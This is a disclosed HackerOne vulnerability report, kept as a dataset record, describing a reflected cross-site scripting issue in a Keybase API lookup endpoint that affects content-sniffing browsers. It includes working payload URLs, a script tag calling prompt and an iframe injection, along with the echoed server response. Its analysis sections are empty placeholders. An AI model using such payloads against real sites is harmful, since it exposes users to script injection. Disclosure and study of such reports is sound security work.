---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '92915'
original_report_id: '92915'
title: HackerOne Report 92915
weakness: Cross-site Scripting (XSS) - Generic
team_handle: keybase
created_at: '2015-10-08T10:26:46.583Z'
disclosed_at: '2015-10-30T22:34:47.375Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# HackerOne Report 92915

## Metadata

- HackerOne Report ID: 92915
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: keybase
- Disclosed At: 2015-10-30T22:34:47.375Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

This xss issue only affects content sniffing browsers (older versions that don't see the X-Content-Type-Options: nosniff header that you're sending.

https://keybase.io/_/api/1.0/user/lookup.json?usernames=fake_user1%2cfake_user2'%22()%26%25<acx><ScRiPt%20>prompt(/XSS/)</ScRiPt>

This returns a page that contains this information:
{"status":{"code":100,"desc":"missing or invalid input","fields":{"usernames":"bad list value: fake_user2'\"()&%<acx><ScRiPt >prompt(/XSS/)</ScRiPt>"},"name":"INPUT_ERROR"}}

I've attached the screenshot showing the behavior. 

Iframe injection may also be possible as seen via this url and another attached screenshot.

/_/api/1.0/user/lookup.json?usernames=fake_user1%2cfake_user2'%22()%26%25<acx><iframe%20src=https://www.geeknik.com></iframe></ScRiPt>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
